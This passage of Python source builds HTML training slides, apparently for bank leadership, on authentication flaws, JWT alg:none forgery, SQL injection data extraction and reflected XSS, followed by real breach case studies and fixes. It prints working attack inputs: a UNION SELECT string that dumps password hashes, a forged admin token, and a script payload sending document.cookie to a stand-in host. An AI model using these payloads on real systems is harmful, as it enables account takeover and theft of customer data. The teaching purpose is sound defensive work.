    <span class="var">$recoveryStage</span> &gt;= <span class="num">2</span>   <span class="cm">// checks done...</span>
    &amp;&amp; <span class="var">$recoveryUid</span> &gt; <span class="num">0</span><span class="vuln-hl">;   // ...but for WHOM?</span></code></pre>
<div class="card red-left mt2"><p class="desc" style="font-size:.9rem">The gate trusts that the checks were completed. It never checks they were completed for the <strong style="color:var(--red)">account now being reset</strong> &mdash; so progress earned for one account unlocks a reset for another.</p></div>
</div>
</div>
</div></section>'''

L25_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We typed a customer&rsquo;s ID into &ldquo;Forgot password,&rdquo;<br/>and the bank logged us in as them.</h1>
<div class="sep" style="max-width:200px;margin:2rem auto"></div>
<p class="big" style="color:var(--t2)">No password. No OTP. No security questions.<br/>Every identity check was in place &mdash; and none of them stood between us and the account.</p>
<p class="mt3 desc">Nobody broke a check. They just started a <em>recovery</em> and were treated as the owner.</p>
</div></section>'''

L25_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; And Who Should Have Caught It</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// One state. One meaning. One check.</span>
<span class="kw">if</span> (!<span class="fn">isset</span>(<span class="var">$_SESSION</span>[<span class="fix-hl">'uid'</span>])) {
    <span class="fn">redirect</span>(<span class="str">'/login'</span>);
}

<span class="cm">// And on successful OTP, rebuild the session:</span>
<span class="fn">session_regenerate_id</span>(<span class="kw">true</span>);
<span class="kw">unset</span>(<span class="var">$_SESSION</span>[<span class="str">'pending_uid'</span>]);</code></pre>
<p class="desc mt2" style="font-size:.88rem">A partially authenticated session should never be able to reach an authenticated page. Promote it once, cleanly, and discard the intermediate state.</p>
</div>
<div>
<div class="card accent-left"><h3 style="color:var(--indigo)">Identity &amp; Access Management</h3><p class="desc mt1">IAM owns the <strong>definition</strong> of what &ldquo;authenticated&rdquo; means. If there are two variables that both look like proof of identity, that is an IAM design gap before it is a coding bug.</p></div>
<div class="card accent-left mt2"><h3 style="color:var(--indigo)">Application Security</h3><p class="desc mt1">Authorisation logic is where scanners are weakest. A SAST tool will not flag this &mdash; the code is syntactically perfect. <strong>This is what manual review and penetration testing are for.</strong></p></div>
</div>
</div>
<p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Which of our checks prove identity, and which only prove someone started a login?&rdquo;</p>
</div></section>'''

# ======================= L12 — JWT alg:none ==================================
L12_TITLE = '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 4</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; CWE-347 &bull; OWASP A02:2021</span></div>
<h1>JWT alg:none &mdash; Forge Your Own Identity Card</h1>
<p class="big mt2">&ldquo;We&rsquo;re going to promote ourselves to administrator by editing a cookie.&rdquo;</p>
</div></section>'''

L12_HOW = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">What a Token Actually Is</h3>
<p class="desc mb2">After you log in, the server hands you a JSON Web Token &mdash; a badge you present on every later request. It has three parts, separated by dots.</p>
<div class="jwt mt2">
<span class="jh">{"alg":"HS256","typ":"JWT"}</span><span style="color:var(--t3);padding:.3rem .1rem">.</span><span class="jp">{"uid":3041,"role":"customer"}</span><span style="color:var(--t3);padding:.3rem .1rem">.</span><span class="js">&#9679;&#9679;&#9679; signature &#9679;&#9679;&#9679;</span>
</div>
<div class="grid3 mt3">
<div class="card red-left"><h3 style="font-size:1rem">Header</h3><p class="desc mt1" style="font-size:.86rem">Says <strong>which algorithm</strong> was used to sign the token.</p></div>
<div class="card accent-left"><h3 style="font-size:1rem">Payload</h3><p class="desc mt1" style="font-size:.86rem">Who you are and what you are allowed to do. <strong>Not encrypted</strong> &mdash; just encoded.</p></div>
<div class="card green-left"><h3 style="font-size:1rem">Signature</h3><p class="desc mt1" style="font-size:.86rem">Proof the server issued it and nobody edited it.</p></div>
</div>
<div class="card yellow-left mt3"><p class="desc">Notice the problem hiding in plain sight: <strong style="color:var(--t1)">the token itself tells the server how to verify the token.</strong> The attacker controls the token.</p></div>
</div></section>'''

L12_ATTACK = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">The Attack &mdash; Three Edits</h3>
<div class="grid2 gap2">
<div>
<p class="sub mb1">What we change</p>
<div class="card red-left mt1">
<p class="desc" style="font-size:.88rem"><strong style="color:var(--t1)">1.</strong> Algorithm &rarr; <code style="color:var(--red)">"none"</code></p>
<p class="desc mt1" style="font-size:.88rem"><strong style="color:var(--t1)">2.</strong> Role &rarr; <code style="color:var(--red)">"admin"</code></p>
<p class="desc mt1" style="font-size:.88rem"><strong style="color:var(--t1)">3.</strong> Signature &rarr; <em>deleted</em></p>
</div>
<div class="jwt mt2">
<span class="jh">{"alg":"none"}</span><span style="color:var(--t3);padding:.3rem .1rem">.</span><span class="jp">{"uid":3041,"role":"admin"}</span><span style="color:var(--t3);padding:.3rem .1rem">.</span><span class="jx">(nothing)</span>
</div>
<p class="desc mt2" style="font-size:.86rem">Paste it back into the cookie. Refresh the page.</p>
</div>
<div>
<p class="sub mb1">What the library does</p>
<pre class="mt1"><code><span class="cm">// Trusting the token's own header</span>
<span class="var">$alg</span> = <span class="var">$header</span>[<span class="str">'alg'</span>];

<span class="kw">if</span> (<span class="var">$alg</span> === <span class="vuln-hl"><span class="str">'none'</span></span>) {
    <span class="cm">// "Unsigned token — nothing to verify"</span>
    <span class="kw">return</span> <span class="kw">true</span>;
}</code></pre>
<div class="card red-left mt2"><p class="desc" style="font-size:.9rem"><code>alg:none</code> exists in the JWT standard for tokens that were already verified another way. Left enabled on a login cookie, it means <strong style="color:var(--red)">anyone can mint any identity.</strong></p></div>
</div>
</div>
</div></section>'''

L12_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We did not steal an admin password.<br/>We simply wrote &ldquo;admin&rdquo; on our own badge &mdash; and the guard waved us through.</h1>
<div class="sep" style="max-width:200px;margin:2rem auto"></div>
<p class="big" style="color:var(--t2)">The cryptography was never broken.<br/>The application just agreed not to use it.</p>
</div></section>'''

L12_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; And Who Should Have Caught It</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// Never read the algorithm from the token.</span>
<span class="cm">// The SERVER decides. Always.</span>
<span class="var">$decoded</span> = <span class="var">JWT</span>::<span class="fn">decode</span>(
    <span class="var">$token</span>,
    <span class="kw">new</span> <span class="fn">Key</span>(<span class="var">$secret</span>, <span class="fix-hl"><span class="str">'HS256'</span></span>)
);

<span class="cm">// Reject 'none' explicitly. Verify exp, iss, aud.</span>
<span class="cm">// Keep the signing key out of the repo.</span></code></pre>
<p class="desc mt2" style="font-size:.88rem">One configuration line. The library has supported it the whole time &mdash; the default was simply permissive.</p>
</div>
<div>
<div class="card accent-left"><h3 style="color:var(--indigo)">Application Security</h3><p class="desc mt1"><strong>Dependency defaults are design decisions.</strong> &ldquo;We used the standard library&rdquo; is not the same as &ldquo;we configured it safely.&rdquo;</p></div>
<div class="card accent-left mt2"><h3 style="color:var(--indigo)">IAM</h3><p class="desc mt1">Anything carrying <strong>role or entitlement</strong> must be signed, short-lived, and validated server-side on every request &mdash; never trusted because it arrived in a cookie.</p></div>
</div>
</div>
<p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Where in our stack does a user-supplied token decide what that user is allowed to do?&rdquo;</p>
</div></section>'''

# ======================= G2 — SQLi DATA EXTRACTION ===========================
G2_TITLE = '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 6</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; CWE-89 &bull; OWASP A03:2021</span></div>
<h1>SQL Injection &mdash; Extract the Entire Database</h1>
<p class="big mt2">&ldquo;The first injection let us in. This one empties the vault.&rdquo;</p>
</div></section>'''

G2_HOW = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">Same Flaw. Completely Different Objective.</h3>
<div class="vs mt2">
<div>
<p class="sub mb1">G1 &mdash; Login bypass</p>
<p class="desc">Used injection to make a <strong>check</strong> return true. Got in as one customer.</p>
<p class="desc mt1" style="color:var(--t3);font-size:.88rem">Impact: one account.</p>
</div>
<div style="border-left-color:var(--red)!important">
<p class="sub mb1">G2 &mdash; Data extraction</p>
<p class="desc">Uses injection to make the page <strong>print data it was never meant to show</strong>.</p>
<p class="desc mt1" style="color:var(--red);font-size:.88rem">Impact: every customer in the database.</p>
</div>
</div>
<p class="desc mt3">The statements page runs a search. Whatever it finds, it renders into a table on screen. If an attacker can control the query, the page becomes a <strong style="color:var(--t1)">general-purpose data viewer</strong> for the entire database &mdash; using the bank&rsquo;s own formatting.</p>
<div class="card yellow-left mt2"><p class="desc"><code>UNION SELECT</code> is the key: it bolts a second query onto the first, and the results arrive in the same table.</p></div>
</div></section>'''

G2_ATTACK = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">The Attack</h3>
<div class="grid2 gap2">
<div>
<p class="sub mb1">What we type into the search box</p>
<pre class="mt1"><code><span class="str">' UNION SELECT customer_id, name,
   password_md5, email FROM users #</span></code></pre>
<p class="sub mb1 mt2">What the server runs</p>
<pre class="mt1"><code><span class="kw">SELECT</span> date, description, amount, balance
<span class="kw">FROM</span> transactions
<span class="kw">WHERE</span> narrative <span class="kw">LIKE</span> <span class="str">'%'</span><span class="vuln-hl"> UNION SELECT
  customer_id, name, password_md5, email
  FROM users #</span><span class="cm">%'</span></code></pre>
</div>
<div>
<p class="sub mb1">What appears on screen</p>
<table class="mt1">
<thead><tr><th>Date</th><th>Description</th><th>Amount</th></tr></thead>
<tbody>
<tr><td>BS100234</td><td>Rajesh Kumar</td><td style="color:var(--red);font-family:var(--mono);font-size:.72rem">5f4dcc3b5aa...</td></tr>
<tr><td>BS100891</td><td>Priya Sharma</td><td style="color:var(--red);font-family:var(--mono);font-size:.72rem">e10adc3949b...</td></tr>
<tr><td>BS101447</td><td>Amit Patel</td><td style="color:var(--red);font-family:var(--mono);font-size:.72rem">25d55ad283a...</td></tr>
<tr><td colspan="3" style="color:var(--t3);text-align:center">&hellip; 48,000 more rows &hellip;</td></tr>
</tbody>
</table>
<div class="card red-left mt2"><p class="desc" style="font-size:.9rem">The bank politely paginated our stolen data. No alarm fired &mdash; to the server, this was a customer searching their statements.</p></div>
</div>
</div>
</div></section>'''

G2_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Every customer. Every name. Every password hash.<br/>Rendered in the bank&rsquo;s own table, with the bank&rsquo;s own styling.</h1>
<div class="sep" style="max-width:200px;margin:2rem auto"></div>
<p class="big" style="color:var(--t2)">This is the shape of almost every mass data breach you have read about.<br/>Not a dramatic break-in. A search box that answered the wrong question.</p>
</div></section>'''

G2_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; Defence in Depth</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// 1. Parameterise — same as G1</span>
<span class="var">$stmt</span> = <span class="var">$pdo</span>-&gt;<span class="fn">prepare</span>(
  <span class="str">'SELECT date, description, amount
     FROM transactions
    WHERE account_id = <span class="fix-hl">:acct</span>
      AND narrative LIKE <span class="fix-hl">:q</span>'</span>
);</code></pre>
<p class="desc mt2" style="font-size:.88rem">Note <code>account_id = :acct</code> &mdash; the query is scoped to <em>this</em> customer, so even a flaw cannot reach another customer&rsquo;s rows.</p>
</div>
<div>
<div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">Least privilege on the database</h3><p class="desc mt1" style="font-size:.88rem">The web application&rsquo;s database user should not be able to read the <code>users</code> table at all. One injection then yields nothing.</p></div>
<div class="card green-left mt2"><h3 style="font-size:1rem;color:var(--green)">Detection</h3><p class="desc mt1" style="font-size:.88rem">A single session reading 48,000 rows is an <strong>anomaly</strong>. This is precisely what the SOC should alert on &mdash; the last line when prevention fails.</p></div>
<div class="card green-left mt2"><h3 style="font-size:1rem;color:var(--green)">Never store MD5 passwords</h3><p class="desc mt1" style="font-size:.88rem">Stolen bcrypt hashes are a bad day. Stolen MD5 hashes are plaintext by dinnertime.</p></div>
</div>
</div>
</div></section>'''

# ======================= G4 — REFLECTED XSS ==================================
G4_TITLE = '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 7</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; CWE-79 &bull; OWASP A03:2021</span></div>
<h1>Reflected XSS &mdash; Turn the Bank&rsquo;s Page Against Its Own Customer</h1>
<p class="big mt2">&ldquo;Every attack so far targeted the bank. This one targets <em>you</em>.&rdquo;</p>
</div></section>'''

G4_HOW = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">The Page Repeats What You Said</h3>
<p class="desc mb2">Search for something that does not exist and the bank is helpful about it:</p>
<div class="urlbar mt2"><span style="color:var(--t3)">https://bank.example/statements?q=</span><span style="color:#9ece6a">groceries</span></div>
<div class="card mt2"><p class="desc">No results found for <strong style="color:var(--t1)">groceries</strong></p></div>
<p class="desc mt3">Harmless &mdash; until you notice the page is taking text from the address bar and writing it into the HTML. So what if the text is not a word, but <strong style="color:var(--t1)">instructions</strong>?</p>
<pre class="mt2"><code><span class="cm">// statements.php — the echo heard round the world</span>
<span class="kw">echo</span> <span class="str">"&lt;p&gt;No results found for &lt;b&gt;"</span> . <span class="vuln-hl">$_GET['q']</span> . <span class="str">"&lt;/b&gt;&lt;/p&gt;"</span>;</code></pre>
</div></section>'''

G4_ATTACK = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">The Attack &mdash; A Link, Not a Break-In</h3>
<div class="grid2 gap2">
<div>
<p class="sub mb1">The attacker sends this link</p>
<div class="urlbar mt1" style="white-space:normal;word-break:break-all"><span style="color:var(--t3)">https://bank.example/statements?q=</span><span style="color:var(--red)">&lt;script&gt;fetch('//evil.site/?c='+document.cookie)&lt;/script&gt;</span></div>
<p class="desc mt2" style="font-size:.9rem">Note the domain: it really is <strong style="color:var(--t1)">the bank&rsquo;s own site</strong>. Valid certificate. Correct padlock. Nothing to notice.</p>
<div class="card red-left mt2"><p class="desc" style="font-size:.88rem">The victim is already logged in. The script runs <em>as them</em>, inside the bank&rsquo;s own page, with their session.</p></div>
</div>
<div>
<p class="sub mb1">What the attacker can now do</p>
<div class="flex-col" style="gap:.5rem">
<div class="card" style="padding:.7rem 1rem"><p class="desc" style="font-size:.86rem">Steal the session cookie &rarr; log in as the customer</p></div>
<div class="card" style="padding:.7rem 1rem"><p class="desc" style="font-size:.86rem">Read every page the customer can read</p></div>
<div class="card" style="padding:.7rem 1rem"><p class="desc" style="font-size:.86rem">Silently submit a transfer in the background</p></div>
<div class="card" style="padding:.7rem 1rem"><p class="desc" style="font-size:.86rem">Rewrite the page &mdash; a perfect fake login form, on the real domain</p></div>
</div>
<p class="desc mt2" style="font-size:.86rem;color:var(--t3)">Send the same link to an administrator and the attacker inherits the admin console.</p>
</div>
</div>
</div></section>'''

G4_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">&ldquo;Check your phishing awareness training&rdquo; does not help here.<br/>The link <em>was</em> the bank.</h1>
<div class="sep" style="max-width:200px;margin:2rem auto"></div>
<p class="big" style="color:var(--t2)">Your customers are told to check the domain and the padlock.<br/>In this attack, both are perfect.</p>
</div></section>'''

G4_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; Three Independent Layers</h3>
<div class="grid3 mt2">
<div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">1. Encode on output</h3><pre class="mt1" style="padding:.7rem .9rem"><code><span class="kw">echo</span> <span class="fn">htmlspecialchars</span>(
  <span class="var">$_GET</span>[<span class="str">'q'</span>],
  <span class="var">ENT_QUOTES</span>
);</code></pre><p class="desc mt1" style="font-size:.84rem">The script becomes visible text instead of running code.</p></div>
<div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">2. Content Security Policy</h3><pre class="mt1" style="padding:.7rem .9rem"><code><span class="var">Content-Security-Policy:</span>
 <span class="str">script-src 'self'</span></code></pre><p class="desc mt1" style="font-size:.84rem">Even if a script is injected, the browser refuses to run it or phone home.</p></div>
<div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">3. HttpOnly cookies</h3><pre class="mt1" style="padding:.7rem .9rem"><code><span class="var">Set-Cookie:</span> <span class="str">session=...;
  HttpOnly; Secure;
  SameSite=Strict</span></code></pre><p class="desc mt1" style="font-size:.84rem">JavaScript cannot read the session cookie at all.</p></div>
</div>
<div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">The leadership point:</strong> no single control stops this. Encoding is the fix; CSP and HttpOnly are what save you on the day the encoding is missed on one page out of four hundred. <strong>That is what &ldquo;defence in depth&rdquo; actually buys.</strong></p></div>
</div></section>'''

# =========================== REAL-WORLD INCIDENTS ============================
RW_G1 = realworld(
 'TalkTalk, 2015 &mdash; a teenager, and one injectable page',
 'TalkTalk inherited a set of legacy web pages through an acquisition. One of them concatenated user input straight into a SQL query &mdash; exactly what you just saw. Attackers, among them a 17-year-old, pulled customer records directly out of the database. The chief executive ended up explaining it live on national television.',
 [('157,000','customers&rsquo; data stolen'),('&pound;400k','ICO fine &mdash; a record at the time'),('~&pound;77M','total cost to the business'),('101,000','customers lost afterwards')],
 'when we acquire a company or inherit a legacy system, who re-tests the code we just took ownership of &mdash; and before or after it goes live under our brand?')

RW_L11 = realworld(
 'T-Mobile, 2023 &mdash; one API that answered too much',
 'A single application programming interface returned more customer data than the screen ever displayed. No password was broken and no firewall was bypassed &mdash; attackers simply asked the API, repeatedly, and it answered. It ran for roughly six weeks before anyone noticed.',
 [('37M','customer accounts exposed'),('~41 days','before detection'),('1','API endpoint involved'),('$350M','earlier T-Mobile breach settlement')],
 'do we know what our APIs actually return, as opposed to what our screens display? Who reviews the response, not just the request?')

RW_L25 = realworld(
 'Uber, 2022 &mdash; authentication succeeded, and that was the problem',
 'An attacker wore down an employee with repeated multi-factor prompts until one was approved. From there, a half-trusted foothold was enough: an internal script held hardcoded administrator credentials, and the session was trusted far beyond what that login had actually proven. The result was access to internal cloud, finance and security tooling.',
 [('Full','internal admin access achieved'),('18','age of the primary attacker'),('MFA','was deployed, and defeated'),('Hours','from foothold to full access')],
 'once someone is inside, what does our session actually trust them to do &mdash; and would we notice a login that never completed its second factor?')

RW_L12 = realworld(
 'The alg:none flaw, 2015 &mdash; when the lock asked the key what to do',
 'Security researchers found that most popular JSON Web Token libraries &mdash; across Node, Python, Ruby, PHP and Java &mdash; accepted tokens that declared their own algorithm as &ldquo;none&rdquo;. Any user could forge a valid-looking token for any identity. The flaw was not in the cryptography; it was in the default configuration that thousands of applications accepted without reading.',
 [('CVE-2015-9235','the assigned identifier'),('Dozens','of libraries affected'),('Any','identity could be forged'),('1 line','of config to prevent it')],
 'which security-critical defaults did we inherit from a library rather than choose &mdash; and has anyone been asked to justify them?')

RW_L1 = realworld(
 'First American Financial, 2019 &mdash; 885 million documents, one digit at a time',
 'A document link on First American&rsquo;s website contained a sequential number. Change the number, see somebody else&rsquo;s paperwork &mdash; bank account numbers, Social Security numbers, mortgage and tax records, wire transfer receipts, going back to 2003. No login was required at any point. In the same pattern, Optus in Australia lost 9.8 million customer records through an unauthenticated API endpoint.',
 [('885M','documents exposed'),('2003','earliest records reachable'),('$0','skill or tooling required'),('9.8M','Australians, in the Optus parallel')],
 'where in our estate does changing a number in a URL change whose data you see &mdash; and would any log tell us it had happened?')

RW_G2 = realworld(
 'MOVEit, 2023 &mdash; one SQL injection, thousands of victims',
 'MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.',
 [('2,770+','organisations breached'),('95M+','individuals affected'),('1','vulnerability in 1 product'),('&gt;$12B','estimated cumulative cost')],
 'which externally exposed third-party products hold our sensitive data &mdash; and how fast could we find out whether we are affected by tomorrow&rsquo;s advisory?')

RW_G4 = realworld(
 'British Airways, 2018 &mdash; 22 lines of JavaScript',
 'Attackers modified a script already loaded by the British Airways payment page. The page still showed the right domain, the right branding and a valid certificate. As customers typed their card details, the script copied each keystroke to the attacker&rsquo;s server. It ran for fifteen days.',
 [('~429,000','customers&rsquo; card data skimmed'),('&pound;183M','fine originally proposed'),('&pound;20M','fine finally imposed'),('15 days','before it was detected')],
 'do we treat the JavaScript running on our pages &mdash; including third-party scripts &mdash; as part of our attack surface, with the same rigour as server code?')

RW_G9 = realworld(
 'Equifax, 2017 &mdash; a patch that waited two months',
 'A command-injection flaw in Apache Struts had a patch available on 7 March 2017. Equifax did not apply it. Attackers used exactly that flaw to run commands on an internet-facing server, then moved through the network for 76 days. An expired certificate meant the monitoring that should have caught the outbound data had been blind for nineteen months.',
 [('147.9M','Americans&rsquo; records stolen'),('76 days','of undetected access'),('$700M+','settlement with regulators'),('CEO, CIO, CSO','all departed')],
 'what is our real time-to-patch for an internet-facing, actively exploited vulnerability &mdash; measured, not estimated? And would our monitoring actually be watching that day?')

# =========================== IDOR — STRONGER MESSAGE =========================
IDOR_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,3vw,2.4rem)">We did not hack anything.<br/>We changed one number &mdash; and the money moved.</h1>
<div class="sep" style="max-width:200px;margin:2.2rem auto"></div>
<div class="grid3" style="gap:1rem;text-align:left">
<div class="card red-left"><p class="desc" style="font-size:.9rem">No password was stolen.</p></div>
<div class="card red-left"><p class="desc" style="font-size:.9rem">No malware was deployed.</p></div>
<div class="card red-left"><p class="desc" style="font-size:.9rem">No alarm was raised.</p></div>
</div>
<p class="big mt3" style="color:var(--t2)">The application asked &ldquo;who are you?&rdquo; when it logged us in.<br/>It never once asked <strong style="color:var(--t1)">&ldquo;is this actually your account?&rdquo;</strong></p>
<p class="mt2 desc">Authentication without authorisation is a doorman who checks your ID at the entrance,<br/>then lets you into every room in the building.</p>
</div></section>'''

# =========================== ATTACK CHAINING =================================
def cstep(i, vid, t, d):
    return '<div class="chain-step"><div class="cs-id">%s &nbsp;&bull;&nbsp; STEP %d</div><div class="cs-t">%s</div><div class="cs-d">%s</div></div>' % (vid, i, t, d)

S_CHAIN = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">Combining weaknesses</p>
<h2>No real attacker uses one vulnerability. They chain them.</h2>
<p class="desc mt2">Rated individually, most of today&rsquo;s findings are a Medium. Here is the same list, read the way an attacker reads it.</p>
<div class="chain">
''' + ''.join([
 cstep(1,'G1','Get in','SQL injection at login. Now a legitimate customer.'),
 cstep(2,'L11','Defeat 2FA','The OTP is in the response. No phone needed.'),
 cstep(3,'L25','Stay in','A half-finished session is accepted as a real one.'),
 cstep(4,'L12','Become admin','Forge a token. Role changes from customer to admin.'),
 cstep(5,'L1','Move money','Change an account number. Funds leave.'),
 cstep(6,'G2','Take the data','UNION SELECT returns every customer record.'),
 cstep(7,'G9','Own the server','Command injection. The host itself is now theirs.'),
]) + '''</div>
<div class="grid2 gap2 mt3">
<div class="card red-left"><h3 style="font-size:1.05rem">Why severity ratings mislead</h3><p class="desc mt1">Each step was individually survivable. Chained, they are a reportable breach, a regulatory event and a front-page story. <strong style="color:var(--t1)">Risk is not additive &mdash; it compounds.</strong></p></div>
<div class="card green-left"><h3 style="font-size:1.05rem">What this changes for you</h3><p class="desc mt1">&ldquo;We will fix the Mediums next quarter&rdquo; is a <strong style="color:var(--t1)">risk decision</strong>, not a scheduling one. The right question is not &ldquo;how bad is this finding?&rdquo; but <strong style="color:var(--t1)">&ldquo;what does this finding unlock?&rdquo;</strong></p></div>
</div>
</div></section>'''

S_BREAK_CHAIN = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">The good news</p>
<h2>A chain breaks at <em>any</em> link.</h2>
<p class="desc mt2">The attacker needs all seven steps to work. You only need to break one.</p>
<div class="grid2 gap2 mt3">
<div class="card green-left"><h3 style="font-size:1.05rem">Parameterise one query</h3><p class="desc mt1">Steps 1 and 6 both disappear. The chain never starts and the data never leaves.</p></div>
<div class="card green-left"><h3 style="font-size:1.05rem">Add one ownership check</h3><p class="desc mt1">Step 5 disappears. <code>AND account_owner = :current_user</code> &mdash; five words.</p></div>
<div class="card green-left"><h3 style="font-size:1.05rem">Pin one algorithm</h3><p class="desc mt1">Step 4 disappears. Privilege escalation becomes impossible via the token.</p></div>
<div class="card green-left"><h3 style="font-size:1.05rem">Detect one anomaly</h3><p class="desc mt1">Steps 6 and 7 get caught. One session reading 48,000 rows should page somebody.</p></div>
</div>
<p class="big center mt3">Defence does not require perfection.<br/>It requires that the attacker&rsquo;s path has at least one reliable wall across it.</p>
</div></section>'''

# =========================== QUESTIONS BEFORE PRODUCTION =====================
S_QUESTIONS = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">What you take back</p>
<h2 class="mb2">Sharper questions &mdash; before it reaches production</h2>
<div class="grid2 gap2">
<div class="card accent-left"><h3 style="font-size:1.05rem">In design review</h3>
<p class="desc mt1">&ldquo;What happens if the user changes this value by hand?&rdquo;</p>
<p class="desc mt1">&ldquo;Which of these checks run on the server, and which only in the browser?&rdquo;</p>
<p class="desc mt1">&ldquo;Show me where this decides <em>whose</em> data to return &mdash; not just whether someone is logged in.&rdquo;</p></div>
<div class="card accent-left"><h3 style="font-size:1.05rem">In the pipeline</h3>
<p class="desc mt1">&ldquo;Does our scanner <strong>block the merge</strong>, or just file a ticket nobody reads?&rdquo;</p>
<p class="desc mt1">&ldquo;What is our measured time-to-patch for an internet-facing system?&rdquo;</p>
<p class="desc mt1">&ldquo;Which security defaults did we inherit from a library rather than choose?&rdquo;</p></div>
<div class="card accent-left"><h3 style="font-size:1.05rem">On identity</h3>
<p class="desc mt1">&ldquo;Can one identity do too much?&rdquo;</p>
<p class="desc mt1">&ldquo;If someone forged this token, what would it let them do?&rdquo;</p>
<p class="desc mt1">&ldquo;Do we treat a half-completed login as a login?&rdquo;</p></div>
<div class="card accent-left"><h3 style="font-size:1.05rem">On risk and release</h3>
<p class="desc mt1">&ldquo;If this is exploited tomorrow, what is the blast radius?&rdquo;</p>
<p class="desc mt1">&ldquo;What does this finding <strong>unlock</strong> if combined with another?&rdquo;</p>
<p class="desc mt1">&ldquo;What is the hard date on this fix, and who owns it?&rdquo;</p></div>
</div>
<p class="big center mt3">You do not need to know the answer.<br/>You need to ask the question early enough that somebody has to go and find one.</p>
</div></section>'''

# ================= v2: RECENT + INDIA-WEIGHTED REAL-WORLD CASES ==============
RW_G1 = realworld(
 'Fortinet, 2024 &mdash; SQL injection inside a security product',
 'A SQL injection flaw in FortiClient EMS &mdash; software enterprises buy <em>to manage endpoint security</em> &mdash; let an unauthenticated attacker run commands on the server. A patch existed. Exploitation in the wild began within days of public disclosure, and the flaw went onto the US authorities&rsquo; &ldquo;known exploited&rdquo; list. The same 25-year-old bug class you just used, shipping in 2024.',
 [('CVE-2023-48788','the identifier'),('9.8 / 10','severity score'),('Days','from disclosure to mass exploitation'),('BFSI','heavily represented among users')],
 'our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?',
 ('And when it reaches customers &mdash; TalkTalk, UK',
  'An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.',
  'red-left'))

RW_L11 = realworld(
 'Star Health, 2024 &mdash; when the data became self-service',
 'Customer records from one of India&rsquo;s largest health insurers &mdash; names, phone numbers, identity documents, and <em>medical reports and claim records</em> &mdash; were made queryable by anyone through chatbots on a messaging platform. Reporting indicated the access originated from inside the organisation rather than from a broken firewall. Star Health took legal action against the platform.',
 [('~31M','customers&rsquo; records exposed'),('5.8 TB','of data reportedly offered'),('Medical','records, not just contact details'),('Insider','access reported as the route')],
 'who inside our organisation can query customer data at scale &mdash; and would any alert fire if they did it every day for a month?',
 ('The same shape, globally &mdash; T-Mobile, 2023',
  'A single API returned more customer data than any screen ever displayed. Nothing was &ldquo;hacked&rdquo; &mdash; attackers simply asked, repeatedly. <strong>37 million accounts</strong>, running roughly <strong>41 days</strong> before detection.',
  'yellow-left'))

RW_L25 = realworld(
 'Change Healthcare, 2024 &mdash; one remote-access portal without MFA',
 'Attackers logged into a remote-access portal using stolen credentials. That portal had <strong>no multi-factor authentication</strong> &mdash; the second factor existed elsewhere in the organisation but was not enforced on that door. From there came the largest healthcare data breach in US history and weeks of nationwide pharmacy and claims disruption.',
 [('190M','people affected'),('~$2.87B','cost to the parent company'),('0','MFA on the entry point'),('Weeks','of national disruption')],
 'where in our estate is strong authentication <em>implemented but not enforced</em> &mdash; and who would know?',
 ('Closer to home &mdash; AIIMS Delhi, 2022',
  'India&rsquo;s flagship public hospital lost its core systems to ransomware. Patient registration, billing, lab reports and appointments ran on paper for roughly <strong>two weeks</strong>, with around <strong>40 million</strong> patient records implicated. Clinical operations, not just data, were the casualty.',
  'red-left'))

RW_L12 = realworld(
 'Microsoft, 2023 &mdash; forged tokens opened government mailboxes',
 'A state-linked actor obtained a Microsoft signing key and used it to <strong>forge authentication tokens</strong>. Those tokens were cryptographically acceptable, so every system that checked them simply agreed the attacker was whoever the token claimed to be &mdash; including the mailboxes of senior US government officials. A federal review board later called the intrusion <em>preventable</em> and faulted the company&rsquo;s security culture.',
